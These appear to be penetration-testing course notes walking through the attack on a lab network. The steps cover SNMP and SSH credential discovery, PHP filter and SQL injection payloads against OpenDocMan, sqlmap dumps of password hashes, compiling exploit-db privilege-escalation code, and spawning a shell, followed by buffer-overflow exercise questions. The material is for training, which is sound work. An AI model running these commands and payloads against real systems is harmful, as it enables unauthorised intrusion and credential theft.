+/sbin/ifconfig
+ 
+python -c 'import pty;pty.spawn("/bin/bash")'
+ 
+---------------------------Type This-----------------------------------
+cd /tmp
+cat >> exploit2.c << out
+-----------------------------------------------------------------------
+**************paste in the content from here *****************
+https://www.exploit-db.com/raw/37292/
+ 
+**************hit enter a few times *****************
+ 
+---------------------------Type This-----------------------------------
+out
+ 
+ 
+gcc -o boom2 exploit2.c
+ 
+./boom2
+ 
+id
+-----------------------------------------------------------------------
+
+
+
+
+---------------------------Type This-----------------------------------
+sudo nmap -sV 172.31.2.181
+-----------------------------------------------------------------------
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+
+
+---------------------------Type This----------------------------------- 
+sudo nmap -sU -p69,161 172.31.2.181
+-----------------------------------------------------------------------
+PORT    STATE  SERVICE
+69/udp  closed tftp
+161/udp open   snmp
+
+
+---------------------------Type This----------------------------------- 
+sudo apt-get -y install onesixtyone snmp
+ 
+wget https://raw.githubusercontent.com/fuzzdb-project/fuzzdb/master/wordlists-misc/wordlist-common-snmp-community-strings.txt
+ 
+onesixtyone -c wordlist-common-snmp-community-strings.txt 172.31.2.181
+----------------------------------------------------------------------
+Gives error "Community string too long". A little bit of google and I found this reference: https://github.com/trailofbits/onesixtyone/issues/1
+
+---------------------------Type This----------------------------------- 
+cat wordlist-common-snmp-community-strings.txt | grep -v TENmanUFactOryPOWER > snmp-community-strings.txt
+
+onesixtyone -c snmp-community-strings.txt 172.31.2.181
+ 
+snmpwalk -Os -c public -v 1 172.31.2.181
+---------------------------------------------------------------------
+
+Username "eric" found in snmpwalk, and the string "There is a house in New Orleans they call it..."
+
+Google the sentence, and I find out that the whole sentence is “There is a house in New Orleans they call it the rising sun”.
+
+Try to SSH to the box using the credentials eric:therisingsun
+
+
+---------------------------Type This-----------------------------------
+ssh -l eric 172.31.2.181
+     therisingsun
+
+id
+cat /etc/issue
+uname -a
+cat /etc/*release
+ 
+---------------------------Type This-----------------------------------
+cat >> exploit.c << out
+ 
+**************paste in the content from here *****************
+https://www.exploit-db.com/raw/39166/
+ 
+ 
+------ hit enter a few times ------
+ 
+------ then type 'out' ----- this closes the file handle...
+ 
+ 
+ 
+---------------------------Type This-----------------------------------
+gcc -o boom exploit.c
+ 
+./boom
+ 
+id
+ 
+ 
+......YEAH - do the happy dance!!!!
+
+
+
+How to go after 172.31.2.238
+Reference: https://t0w3ntum.com/2017/01/07/baffle/
+ 
+ 
+---------------------------------------------------------------
+sudo nmap -sV -p 3260 172.31.2.217
+ 
+ 
+sudo apt install open-iscsi
+ 
+sudo iscsiadm -m discovery -t  st -p 172.31.2.217
+ 
+sudo iscsiadm -m discovery -t  st -p 172.31.2.217:3260
+ 
+sudo iscsiadm -m node -p 172.31.2.217 --login
+ 
+sudo /bin/bash
+ 
+fdisk -l
+    ***** look for /dev/sda5 - Linux swap / Solaris *******
+ 
+mkdir /mnt/217vm
+ 
+mount /dev/sdb /mnt/217vm
+ 
+cd /mnt/217vm
+ 
+ls
+ 
+cat flag1.txt
+ 
+file bobsdisk.dsk
+ 
+mkdir /media/bobsdisk
+ 
+mount /mnt/217vm/bobsdisk.dsk /media/bobsdisk
+ 
+/mnt/217vm# ls
+ 
+cd /media/bobsdisk/
+ 
+ls
+ 
+cat ToAlice.eml
+ 
+file bobsdisk.dsk
+ 
+mkdir /media/bobsdisk
+ 
+mount /mnt/217vm/bobsdisk.dsk /media/bobsdisk
+ 
+/mnt/217vm# ls
+ 
+cd /media/bobsdisk/
+ 
+ls
+ 
+cat ToAlice.eml
+ 
+file ToAlice.csv.enc
+ 
+file bobsdisk.dsk
+ 
+pwd
+ 
+mkdir /media/bobsdisk
+ 
+ 
+mount /mnt/217vm/bobsdisk.dsk /media/bobsdisk
+ 
+ls
+ 
+cd /media/bobsdisk/
+ 
+ls
+ 
+openssl enc -aes-256-cbc -d -md sha256 -in ToAlice.csv.enc -out ToAlice.csv
+ 
+ls
+ 
+cat ToAlice.eml | grep flag
+ 
+openssl enc -aes-256-cbc -d -md sha256 -in ToAlice.csv.enc -out ToAlice.csv
+ 
+ls
+ 
+cat ToAlice.eml
+    ***** look for supercalifragilisticoespialidoso ******
+ 
+openssl enc -aes-256-cbc -d -md sha256 -in ToAlice.csv.enc -out ToAlice.csv
+ 
+    supercalifragilisticoespialidoso
+ 
+ 
+ls
+ 
+cat ToAlice.csv
+ 
+-----------------------------------------------------
+Web Path,Reason
+5560a1468022758dba5e92ac8f2353c0,Black hoodie. Definitely a hacker site!
+c2444910794e037ebd8aaf257178c90b,Nice clean well prepped site. Nothing of interest here.
+flag3{2cce194f49c6e423967b7f72316f48c5caf46e84},The strangest URL I've seen? What is it?
+ 
+-----------------------------------------------------
+ 
+The hints are "Web Path" and "strangest URL" so let's try the long strings in the URL:
+http://172.31.2.217/5560a1468022758dba5e92ac8f2353c0/
+  -- view source
+ 
+Found this string in the source:
+R2VvcmdlIENvc3RhbnphOiBbU291cCBOYXppIGdpdmVzIGhpbSBhIGxvb2tdIE1lZGl1bSB0dXJr
+ZXkgY2hpbGkuIApbaW5zdGFudGx5IG1vdmVzIHRvIHRoZSBjYXNoaWVyXSAKSmVycnkgU2VpbmZl
+bGQ6IE1lZGl1bSBjcmFiIGJpc3F1ZS4gCkdlb3JnZSBDb3N0YW56YTogW2xvb2tzIGluIGhpcyBi
+YWcgYW5kIG5vdGljZXMgbm8gYnJlYWQgaW4gaXRdIEkgZGlkbid0IGdldCBhbnkgYnJlYWQuIApK
+ZXJyeSBTZWluZmVsZDogSnVzdCBmb3JnZXQgaXQuIExldCBpdCBnby4gCkdlb3JnZSBDb3N0YW56
+YTogVW0sIGV4Y3VzZSBtZSwgSSAtIEkgdGhpbmsgeW91IGZvcmdvdCBteSBicmVhZC4gClNvdXAg
+TmF6aTogQnJlYWQsICQyIGV4dHJhLiAKR2VvcmdlIENvc3RhbnphOiAkMj8gQnV0IGV2ZXJ5b25l
+IGluIGZyb250IG9mIG1lIGdvdCBmcmVlIGJyZWFkLiAKU291cCBOYXppOiBZb3Ugd2FudCBicmVh
+ZD8gCkdlb3JnZSBDb3N0YW56YTogWWVzLCBwbGVhc2UuIApTb3VwIE5hemk6ICQzISAKR2Vvcmdl
+IENvc3RhbnphOiBXaGF0PyAKU291cCBOYXppOiBOTyBGTEFHIEZPUiBZT1UK
+ 
+------ https://www.base64decode.org/ -------
+------ Decoded, but didn't find a flag -----
+ 
+ 
+http://172.31.2.217/c2444910794e037ebd8aaf257178c90b/
+  -- view source --
+  -- Nothing in source --
+ 
+Browsed to the flag link:
+view-source:http://172.31.2.217/c2444910794e037ebd8aaf257178c90b/?p=flag
+  -- view source --
+  -- Nothing in source --
+ 
+ 
+Tried a PHP base64 decode with the URL:
+http://172.31.2.217/c2444910794e037ebd8aaf257178c90b/?p=php://filter/convert.base64-encode/resource=welcome.php
+http://172.31.2.217/c2444910794e037ebd8aaf257178c90b/?p=php://filter/convert.base64-encode/resource=flag.php
+http://172.31.2.217/c2444910794e037ebd8aaf257178c90b/?p=php://filter/convert.base64-encode/resource=party.php
+ 
+------ https://www.base64decode.org/ -------
+Use the string found here:
+http://172.31.2.217/c2444910794e037ebd8aaf257178c90b/?p=php://filter/convert.base64-encode/resource=flag.php
+ 
+-------------------------------------------------------------------
+PD9waHAKZGVmaW5lZCAoJ1ZJQUlOREVYJykgb3IgZGllKCdPb29vaCEgU28gY2xvc2UuLicpOwo/Pgo8aDE+RmxhZzwvaDE+CjxwPkhtbS4gTG9va2luZyBmb3IgYSBmbGFnPyBDb21lIG9uLi4uIEkgaGF2ZW4ndCBtYWRlIGl0IGVhc3kgeWV0LCBkaWQgeW91IHRoaW5rIEkgd2FzIGdvaW5nIHRvIHRoaXMgdGltZT88L3A+CjxpbWcgc3JjPSJ0cm9sbGZhY2UucG5nIiAvPgo8P3BocAovLyBPaywgb2suIEhlcmUncyB5b3VyIGZsYWchIAovLwovLyBmbGFnNHs0ZTQ0ZGIwZjFlZGMzYzM2MWRiZjU0ZWFmNGRmNDAzNTJkYjkxZjhifQovLyAKLy8gV2VsbCBkb25lLCB5b3UncmUgZG9pbmcgZ3JlYXQgc28gZmFyIQovLyBOZXh0IHN0ZXAuIFNIRUxMIQovLwovLyAKLy8gT2guIFRoYXQgZmxhZyBhYm92ZT8gWW91J3JlIGdvbm5hIG5lZWQgaXQuLi4gCj8+Cg==
+-------------------------------------------------------------------
+<?php
+defined ('VIAINDEX') or die('Ooooh! So close..');
+?>
+<h1>Flag</h1>
+<p>Hmm. Looking for a flag? Come on... I haven't made it easy yet, did you think I was going to this time?</p>
+<img src="trollface.png" />
+<?php
+// Ok, ok. Here's your flag!
+//
+// flag4{4e44db0f1edc3c361dbf54eaf4df40352db91f8b}
+//
+// Well done, you're doing great so far!
+// Next step. SHELL!
+//
+//
+// Oh. That flag above? You're gonna need it...
+?>
+ 
+ 
+ 
+ 
+ 
+============================================ Attacking another server because I need a reverse shell =========================================
+---------------------------------------------------------------------------------------------------------------------------------------------------------
+ 
+Attack steps:
+-------------
+ 
+ 
+ 
+Step 1: Ping sweep the target network
+-------------------------------------
+ 
+ 
+---------------------------Type This-----------------------------------
+nmap -sP 172.31.2.0/24
+-----------------------------------------------------------------------
+ 
+ 
+ 
+- Found 3 hosts
+172.31.2.64
+172.31.2.217
+172.31.2.238
+ 
+ 
+ 
+Step 2: Port scan target system
+-------------------------------
+ 
+ 
+---------------------------Type This-----------------------------------
+nmap -sV 172.31.2.64
+-----------------------------------------------------------------------
+ 
+ 
+ 
+-------------Scan Results--------------------------------------------
+PORT     STATE    SERVICE VERSION
+22/tcp   open     ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.6 (Ubuntu Linux; protocol 2.0)
+80/tcp   open     http    Apache httpd 2.4.7 ((Ubuntu))
+514/tcp  filtered shell
+1037/tcp filtered ams
+6667/tcp open     irc     ngircd
+Service Info: Host: irc.example.net; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+--------------------------------------------------------------------
+ 
+ 
+Step 3: Vulnerability Scan the webserver
+----------------------------------------
+ 
+ 
+---------------------------Type This-----------------------------------
+cd ~/toolz/
+ 
+rm -rf nikto*
+ 
+git clone https://github.com/sullo/nikto.git Nikto2
+ 
+cd Nikto2/program
+ 
+perl nikto.pl -h 172.31.2.64
+-----------------------------------------------------------------------
+ 
+ 
+Step 4: Run dirbuster or similar directory bruteforce tool against the target
+-----------------------------------------------------------------------------
+ 
+ 
+---------------------------Type This-----------------------------------
+wget https://dl.packetstormsecurity.net/UNIX/cgi-scanners/Webr00t.pl
+ 
+perl Webr00t.pl -h 172.31.2.64 -v
+-----------------------------------------------------------------------
+                  or with dirbuster (dirb)
+ 
+---------------------------Type This-----------------------------------
+git clone https://github.com/v0re/dirb.git
+ 
+cd dirb/
+ 
+./configure
+ 
+make
+ 
+dirb
+ 
+./dirb http://172.31.2.64 wordlists/big.txt
+-----------------------------------------------------------------------
+ 
+ 
+ 
+Step 5: Browse the web site to look for clues
+---------------------------------------------
+Since no glaring vulnerabilities were found with the scanner - we start just looking around the website itself
+ 
+ 
+..... really didn't get much from here so we just opened the web page in a browser
+http://172.31.2.64/
+ 
+.....browsed to the webpage and saw that it pointed to:
+http://172.31.2.64/jabc
+ 
+....clicked on documentation link and found hidden text that pointed to here:
+http://172.31.2.64/jabcd0cs/
+ 
+....saw that the app was OpenDocMan v1.2.7 and found it was vulnerable:
+https://www.exploit-db.com/exploits/32075/
+ 
+Tried the sql injection described in exploit-db:
+http://172.31.2.64/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user UNION SELECT 1,version(),3,4,5,6,7,8,9
+ 
+http://172.31.2.64/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user UNION SELECT 1,user(),3,4,5,6,7,8,9
+ 
+ 
+ 
+Tried to run sqlmap against the target
+ 
+ 
+---------------------------Type This-----------------------------------
+cd sqlmap-dev/
+python sqlmap.py -u "http://172.31.2.64/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user" -b --dbms=mysql
+ 
+python sqlmap.py -u "http://172.31.2.64/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user" --current-user --dbms=mysql
+ 
+python sqlmap.py -u "http://172.31.2.64/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user" --current-db --dbms=mysql
+ 
+python sqlmap.py -u "http://172.31.2.64/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user" --dbs --dbms=mysql
+ 
+python sqlmap.py -u "http://172.31.2.64/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user" --users --passwords --dbms=mysql
+-----------------------------------------------------------------------
+ 
+ 
+ 
+FOUND: cracked password 'toor' for user 'drupal7' (sqlmap)
+FOUND: 9CFBBC772F3F6C106020035386DA5BBBF1249A11 hash is 'toor' verified at crackstation.net
+ 
+ 
+ 
+---------------------------Type This-----------------------------------
+python sqlmap.py -u "http://172.31.2.64/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user" -D jabcd0cs --tables --dbms=mysql
+ 
+python sqlmap.py -u "http://172.31.2.64/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user" -D jabcd0cs -T odm_user --dump --dbms=mysql
+-----------------------------------------------------------------------
+ 
+    username:   webmin
+    hash:       b78aae356709f8c31118ea613980954b
+ 
+https://hashkiller.co.uk/md5-decrypter.aspx
+   
+    hash:       b78aae356709f8c31118ea613980954b
+    pass:       webmin1980
+ 
+ 
+ok - /phpmyadmin and /webmin both did not work in the browser but these credentials worked for SSH.
+ 
+ 
+ 
+---------------------------Type This-----------------------------------
+ssh -l webmin 172.31.2.64
+    webmin1980
+ 
+id
+ 
+cat /etc/*release
+-----------------------------------------------------------------------
+ 
+ 
+ 
+....tired of not having a real command shell...
+ 
+ 
+---------------------------Type This-----------------------------------
+python -c 'import pty;pty.spawn("/bin/bash")'
+ 
+ 
+cd /tmp
+ 
+pwd
+ 
+ 
+cat >> exploit.c << out
+ 
+**************paste in the content from here *****************
+https://www.exploit-db.com/raw/39166/
+ 
+ 
+------ hit enter a few times ------
+ 
+------ then type 'out' ----- this closes the file handle...
+ 
+ 
+ 
+---------------------------Type This-----------------------------------
+gcc -o boom exploit.c
+ 
+./boom
+-----------------------------------------------------------------------
+ 
+ 
+------------exploit failed, damn let's try another one ---------
+ 
+ 
+ 
+---------------------------Type This-----------------------------------
+cat >> exploit2.c << out
+ 
+**************paste in the content from here *****************
+https://www.exploit-db.com/raw/37292/
+ 
+ 
+out
+ 
+ 
+gcc -o boom2 exploit2.c
+ 
+./boom2
+ 
+id
+ 
+ 
+......YEAH - do the happy dance!!!!
+=============================================== Now back to the previous server ==============================================================
+
+
+
+
+                            #######################################
+----------- ############### # Day 3: Intro to Exploit Development  ################ -----------
+                            #######################################
+
+The first exploit
+https://s3.amazonaws.com/infosecaddictsfiles/SLmail5-5-Exploit.zip
+
+SLMail Scripts Questions
+
+SLmail1.py
+How do you start SLMail?     
+What do you have to be careful of when attaching your debugger to the application?
+How many As are you sending to the application?
+
+SLmail2.py
+What tool(s) can be used to generate a cyclic pattern?
+What port are we attacking?
+What verb are we attacking?
+
+SLmail3.py
+What is the value contained in EIP?
+What is the portion of the cyclic pattern that we must search for?
+What is the distance to EIP?
+
+SLmail4.py
+What do you overwrite EIP with in this script?
+What is the length of your shellcode in this script?
+What is the difference between SOCK_STREAM and SOCK_DGRAM?
+
+SLmail5.py
+What is struct.pack and why are we using it?
+What where is our JMP ESP coming from?
+What is the length of our shellcode in this script?
+
+SLmail6.py
+Why do you subtract the top of ESP from the bottom of ESP in this script?
+What is the length of our shellcode in this script?
+What is the distance to EIP in this script?
+
+
+SLmail7.py
+How do you test for bad characters?
+What are the bad characters in this script?
+What is the address of the JMP ESP in this script and what DLL does it come from?
+
+
+SLmail8.py
+What is DEP and how do you disable it?
+What is the purpose of the stack adjustment?
+What is the purpose of the NOP sled?
+
+
+If you got through SLMail comfortably - then try the script below.
+https://s3.amazonaws.com/infosecaddictsfiles/ff.zip
+
+
+Analysis of the exploit code:
+https://www.exploit-db.com/exploits/15689/
+What is the target platform that this exploit works against? 
+What is the variable name for the distance to EIP?
+What is the actual distance to EIP in bytes?
+Describe what is happening in the variable ‘junk2’? 
+
+Analysis of the training walk-through based on EID: 15689:
+https://s3.amazonaws.com/infosecaddictsfiles/ff.zip
+
+ff1.py
+What does the sys module do? 
+What is sys.argv[1] and sys.argv[2]?  
+What application entry point is being attacked in this script? 
+
+ff2.py
+Explain what is happening in lines 18 - 20
+What is pattern_create.rb doing and where can I find it? 
+Why can’t I just double click the file to run this script? 
+
+ff3.py
+Explain what is happening in lines 17 - to 25? 
+Explain what is happening in lines 30 - to 32? 
+Why is everything below line 35 commented out? 
+
+ff4.py
+Explain what is happening in lines 13 - to 15. 
+Explain what is happening in line 19. 
+Why is everything below line 35 commented out? 
+
+Ff5.py 
+Explain what is happening in line 15. 
+What is struct.pack?. 
+How big is the shellcode in this script? 
+
+ff6.py
+What is the distance to EIP? 
+How big is the shellcode in this script? 
+What is the total byte length of the data being sent to this app? 
+
+ff7.py
+What is a tuple in python? Unchangeable list 
+How big is the shellcode in this script? 1000 Bytes
+Did your app crash in from this script? No
+
+ff8.py
+How big is the shellcode in this script? 
+What is try/except in python? 
+What is socket.SOCK_STREAM in Python? 
+
+ff9.py
+What is going on in lines 19 and 20?
+What is the length of the NOPs? 
+What is socket.SOCK_STREAM in Python? 
+
+ff010.py
+What is going on in lines 18 - 20? 
+How would a stack adjustment help this script?
